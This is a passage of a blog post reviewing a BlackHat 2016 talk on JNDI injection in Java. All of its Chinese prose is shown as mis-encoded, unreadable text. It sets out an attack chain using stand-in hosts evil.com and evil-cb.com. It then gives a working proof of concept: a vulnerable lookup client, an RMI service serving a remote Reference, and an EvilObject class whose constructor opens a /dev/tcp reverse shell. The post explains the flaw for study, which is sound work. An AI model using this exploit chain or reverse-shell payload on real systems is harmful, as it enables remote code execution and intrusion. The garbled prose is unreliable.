<p>è€Œåœ¨è°ƒç”¨ <code>lookup()</code> æˆ–è€… <code>search()</code> æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¸¦ URI åŠ¨æ€çš„è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¾‹å¦‚ä¸Šé¢å·²ç»è®¾ç½®äº†å½“å‰ä¸Šä¸‹æ–‡ä¼šè®¿é—® RMI æœåŠ¡ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨ LDAP çš„ URI æ ¼å¼å»è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒè®¿é—® LDAP æœåŠ¡ä¸Šçš„ç»‘å®šå¯¹è±¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure>
<p>åœ¨è®®é¢˜æ‰€æä¾›çš„ Write-Up é‡Œæœ‰æä¾›è¯¦ç»†è¿œç¦»çš„ä»£ç æ¥è¯´æ˜ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„ URI å»åŠ¨æ€åœ°è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getURLOrDefaultInitCtx()</code> å‡½æ•°çš„å…·ä½“ä»£ç å®ç°ä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// å°è¯•è§£æ URI ä¸­çš„åè®®</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨ Schema åè®®ï¼Œåˆ™å°è¯•è·å–å…¶å¯¹åº”çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>lookup()</code> å‡½æ•°çš„æ—¶å€™ï¼Œä¼šå¯¹ä¸Šä¸‹æ–‡ç¯å¢ƒè¿›è¡Œä¸€ä¸ªåˆå§‹åŒ–ï¼Œè¿™æ—¶å€™ä»£ç ä¼šå¯¹ <code>paramName</code> å‚æ•°å€¼è¿›è¡Œä¸€ä¸ª URL è§£æï¼Œå¦‚æœ <code>paramName</code> åŒ…å«ä¸€ä¸ªç‰¹å®šçš„ Schema åè®®ï¼Œä»£ç åˆ™ä¼šä½¿ç”¨ç›¸åº”çš„å·¥å‚å»åˆå§‹åŒ–ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè¿™æ—¶å€™ä¸ç®¡ä¹‹å‰é…ç½®çš„å·¥å‚ç¯å¢ƒæ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œéƒ½ä¼šè¢«åŠ¨æ€åœ°å¯¹å…¶è¿›è¡Œæ›¿æ¢ã€‚</p>
<h3 id="0x03-åˆ©ç”¨-JNDI-æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ"><a href="#0x03-åˆ©ç”¨-JNDI-æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ" class="headerlink" title="0x03 åˆ©ç”¨ JNDI æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ"></a>0x03 åˆ©ç”¨ JNDI æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ</h3><p>ç»“åˆå‰é¢è¯´åˆ°çš„ä¸¤ä¸ªç‚¹ï¼š</p>
<ul>
<li>JNDI è°ƒç”¨ä¸­ <code>lookup()</code> å‚æ•°å¯æ§</li>
<li>ä½¿ç”¨å¸¦åè®®çš„ URI å¯ä»¥è¿›è¡ŒåŠ¨æ€ç¯å¢ƒè½¬æ¢</li>
<li><code>Reference</code> ç±»åŠ¨æ€ä»£ç è·å–è¿›è¡Œå®ä¾‹åŒ–</li>
</ul>
<p>å³å½“ Java åº”ç”¨ä»£ç ä¸­å‡ºç° <code>lookup(&lt;attacker-controlled&gt;)</code> è¿™ç§æƒ…å†µæ—¶ï¼Œä¼šå½¢æˆ RCEï¼Œæ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ä¸ºï¼š</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png" alt=""></p>
<ol>
<li>æ”»å‡»è€…é€šè¿‡å¯æ§çš„ URI å‚æ•°è§¦å‘åŠ¨æ€ç¯å¢ƒè½¬æ¢ï¼Œä¾‹å¦‚è¿™é‡Œ URI ä¸º <code>rmi://evil.com:1099/refObj</code>ï¼›</li>
<li>åŸå…ˆé…ç½®å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ <code>rmi://localhost:1099</code> ä¼šå› ä¸ºåŠ¨æ€ç¯å¢ƒè½¬æ¢è€Œè¢«æŒ‡å‘ <code>rmi://evil.com:1099/</code>ï¼›</li>
<li>åº”ç”¨å» <code>rmi://evil.com:1099</code> è¯·æ±‚ç»‘å®šå¯¹è±¡ <code>refObj</code>ï¼Œæ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„ RMI æœåŠ¡ä¼šè¿”å›ä¸åç§° <code>refObj</code> æƒ³ç»‘å®šçš„ ReferenceWrapper å¯¹è±¡ï¼ˆ<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>ï¼‰ï¼›</li>
<li>åº”ç”¨è·å–åˆ° <code>ReferenceWrapper</code> å¯¹è±¡å¼€å§‹ä»æœ¬åœ° <code>CLASSPATH</code> ä¸­æœç´¢ <code>EvilObject</code> ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä» <code>http://evil-cb.com/</code> ä¸Šå»å°è¯•è·å– <code>EvilObject.class</code>ï¼Œå³åŠ¨æ€çš„å»è·å– <code>http://evil-cb.com/EvilObject.class</code>ï¼›</li>
<li>æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æœåŠ¡è¿”å›ç¼–è¯‘å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ <code>EvilObject.class</code>ï¼›</li>
<li>åº”ç”¨å¼€å§‹è°ƒç”¨ <code>EvilObject</code> ç±»çš„æ„é€ å‡½æ•°ï¼Œå› æ”»å‡»è€…äº‹å…ˆå®šä¹‰åœ¨æ„é€ å‡½æ•°ï¼Œè¢«åŒ…å«åœ¨é‡Œé¢çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼›</li>
</ol>
<p>æ•´ä¸ªæ”»å‡»çš„å®ç°è¿‡ç¨‹å¦‚ä¸Šé¢æ‰€è¿°ï¼Œ<strong>å…³é”®çš„åˆ©ç”¨ç‚¹åœ¨äºæ”»å‡»è€…å¯æ§çš„å…ã€è®¸åŠ¨æ€ç¯å¢ƒè½¬æ¢çš„æ¥å£å‡½æ•°</strong>ï¼Œè¿™é‡Œä¸¾äº† <code>RMI</code> ç»“åˆ <code>Reference Object</code> è¿›è¡Œ RCE çš„ä¾‹å­ï¼Œæ›´å¤šçš„æ”»å‡»å‘é‡å‚è€ƒåŸè®®é¢˜å†…å®¹å³å¯ï¼ˆå› ä¸ºæˆ‘ä¹Ÿç†è§£å¾—ä¸æ˜¯ç‰¹åˆ«é€å½»ï¼Œæ€•å†™é”™è¯¯å¯¼äº†å¤§å®¶ï¼‰</p>
<p>ä¸‹é¢ç»™å‡ºå®Œæ•´çš„æ¼”ç¤ºä»£ç ç¤ºä¾‹ï¼Œé¦–å…ˆæ˜¯å­˜åœ¨ JNDI æ³¨å…¥çš„ç¨‹åºï¼ˆ<code>RMIService.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥ç€æ˜¯è¦é€šè¿‡ JNDI æ³¨å…¥è¿œç¨‹åŠ è½½çš„ç±»å®ä¾‹ï¼Œä¸€ä¼šå„¿å¯ä»¥ç”¨ <code>python -m SimpleHTTPServer</code> å¯ä¸€ä¸ªä¸´æ—¶çš„ HTTP æœåŠ¡æ¥æä¾›ç¼–è¯‘å¥½çš„ <code>EvilObject.class</code>ï¼ˆ<code>EvilObject.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/sh -i &gt; /dev/tcp/127.0.0.1/1337 2&gt;&amp;1 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>EvilObject</code> ç±»çš„æ„é€ å‡½æ•°ä¸­åŒ…å«äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åå¼¹ Shell çš„ä»£ç ï¼Œä¸€ä¼šå„¿å½“ JNDI æ³¨å…¥æˆåŠŸè§¦å‘æ—¶ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>è¿™é‡Œè¿˜éœ€è¦ä¸€ä¸ª RMI æœåŠ¡ç»‘å®šä¸€ä¸ªç›¸å…³çš„å¼•ç”¨ç±»ï¼ˆ<code>RMIService.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‰é¢ä¹Ÿè¯´åˆ°äº†å¯¹è±¡å®ä¾‹è¦èƒ½æˆåŠŸç»‘å®šåœ¨ RMI æœåŠ¡ä¸Šï¼Œå¿…é¡»ç›´æ¥æˆ–é—´æ¥çš„å®ç° <code>Remote</code> æ¥å£ï¼Œè¿™é‡Œ <code>ReferenceWrapper</code> å°±ç»§æ‰¿äº <code>UnicastRemoteObject</code> ç±»å¹¶å®ç°äº† <code>Remote</code> æ¥å£ã€‚</p>
<p>è¿™é‡Œå°† <code>RMIService.java</code> å’Œ <code>JNDIClient.java</code> æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œå°† <code>EvilObject.java</code> æ”¾åœ¨å¦ä¸€ä¸ªç›®å½•ä¸‹ï¼ˆä¸ºé˜²æ­¢æ¼æ´å¤ç°è¿‡ç¨‹ä¸­åº”ç”¨ç«¯å®ä¾‹åŒ– EvilObject å¯¹è±¡æ—¶ä» CLASSPATH å½“å‰è·¯å¾„æ‰¾åˆ°ç¼–è¯‘å¥½çš„å­—èŠ‚ä»£ç ï¼Œè€Œä¸å»è¿œç«¯è¿›è¡Œä¸‹è½½çš„æƒ…å†µå‘ç”Ÿï¼‰,ç¼–è¯‘è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨ä¸åŒçª—å£ä¸‹æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png" alt=""></p>
<p>æˆåŠŸæ‰§è¡Œåä¼šåœ¨äº‹å…ˆç›‘å¬çš„ç«¯å£ä¸Šè·å–åˆ°åå¼¹çš„ Shellã€‚è¿™é‡Œçš„ä»£ç åªæ˜¯ä¸ºäº†æ–¹ä¾¿è¿˜åŸæ¼æ´åœºæ™¯ï¼Œå…¶ä»–æ¯”è¾ƒç»†èŠ‚çš„ä¸œè¥¿è¿™é‡Œå°±ä¸è®¨è®ºäº†ã€‚çœ‹ä¸æ‡‚çš„å¯ä»¥å¤šç†è§£ä¸‹å‰é¢é‚£å¹…æ¼æ´åˆ©ç”¨è¿‡ç¨‹å›¾ä¾‹ï¼Œè¿™æ ·ç»“åˆä»£ç èƒ½å¤Ÿæ›´å¿«é€Ÿçš„æŒæ¡æ¼æ´åŸç†å’Œå…³é”®ç‚¹ã€‚</p>
<h3 id="0x04-ç®€å•æ€»ç»“"><a href="#0x04-ç®€å•æ€»ç»“" class="headerlink" title="0x04 ç®€å•æ€»ç»“"></a>0x04 ç®€å•æ€»ç»“</h3><p>ç”±äº Java çŸ¥è¯†èƒ½åŠ›æœ‰é™ï¼ŒåŸè®®é¢˜ä¸­æ‰€æ¶‰åŠåˆ°çš„ä¸€äº›ç»†èŠ‚å¯èƒ½å‰–æå¾—ä¸å¤ªå‡†ç¡®ã€‚æ–‡ä¸­åªæ˜¯ç®€å•åœ°æŠŠ JNDI æ³¨å…¥çš„å½¢æˆåŸç†å’Œå¦‚ä½•åˆ©ç”¨ JNDI æ³¨å…¥è¿›è¡Œ RCE è¿›è¡Œäº†ä¸€ä¸ªè¯´æ˜ï¼Œå…·ä½“çš„æ”»å‡»æ–¹å¼ä¹Ÿåªæ˜¯è°ˆåˆ°äº†ç”¨ RMI Reference è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ŒåŸè®®é¢˜å†…å®¹ä¸­è¿˜ä»‹ç»äº†ä¸€äº›å…¶å®ƒçš„æ”»å‡»å‘é‡èƒ½å¤Ÿè¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œä¾‹å¦‚ååºåˆ—åŒ–è§¦å‘ JNDI æ³¨å…¥ã€ä½¿ç”¨ Remote Locations è¿›è¡Œä»£ç æ‰§è¡Œå’Œä¸€äº›å®‰å…¨æœºåˆ¶çš„ç»•è¿‡ç­‰ç­‰ã€‚</p>
<p>åƒä»Šå¹´ 1 æœˆä»½æœ‰å…³ Spring æ¡†æ¶ååºåˆ—åŒ–å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„è¿™ä¸ªæ¼æ´æœ€æ ¹æœ¬åŸç†å°±æ˜¯åˆ©ç”¨äº† JNDI æ³¨å…¥ï¼Œæœ‰å…³è¯¦æƒ…å¯ä»¥å‚è€ƒ <a href="https://www.iswin.org/" target="_blank" rel="noopener">@éšé£</a> å¸ˆå‚…çš„æ–‡ç«  - <a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">ã€ŠSpring framework deserialization RCEæ¼æ´åˆ†æä»¥åŠåˆ©ç”¨ã€‹</a>ï¼Œæ›´å¤šå…³äºè¯¥è®®é¢˜çš„å†…å®¹è¿˜æ˜¯ç¿»é˜…ä¸‹åŸ Paper æ¯”è¾ƒå¥½ã€‚</p>
<p>ï¼ˆä¸–ä¸Šæ¼æ´å¦‚æµ·ï¼Œæˆ‘æ„¿ç•¥çŸ¥ä¸€äºŒï¼‰</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></li>
<li><a href="http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection" target="_blank" rel="noopener">http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html</a></li>
<li><a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-åˆ†æä»¥åŠåˆ©ç”¨" target="_blank" rel="noopener">https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-åˆ†æä»¥åŠåˆ©ç”¨</a></li>
</ul>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-JNDI-æ˜¯ä»€ä¹ˆï¼Ÿ"><span class="toc-number">1.</span> <span class="toc-text">0x00 - JNDI æ˜¯ä»€ä¹ˆï¼Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-JNDI-è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•"><span class="toc-number">1.1.</span> <span class="toc-text">1. JNDI è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RMI-ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç "><span class="toc-number">1.2.</span> <span class="toc-text">2. RMI ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-åè®®åŠ¨æ€è½¬æ¢"><span class="toc-number">2.</span> <span class="toc-text">0x02 JNDI åè®®åŠ¨æ€è½¬æ¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-åˆ©ç”¨-JNDI-æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ"><span class="toc-number">3.</span> <span class="toc-text">0x03 åˆ©ç”¨ JNDI æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-ç®€å•æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">0x04 ç®€å•æ€»ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å‚è€ƒ"><span class="toc-number">5.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&text=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&is_video=false&description=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ&body=Check out this article: http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&name=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 RickGray
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


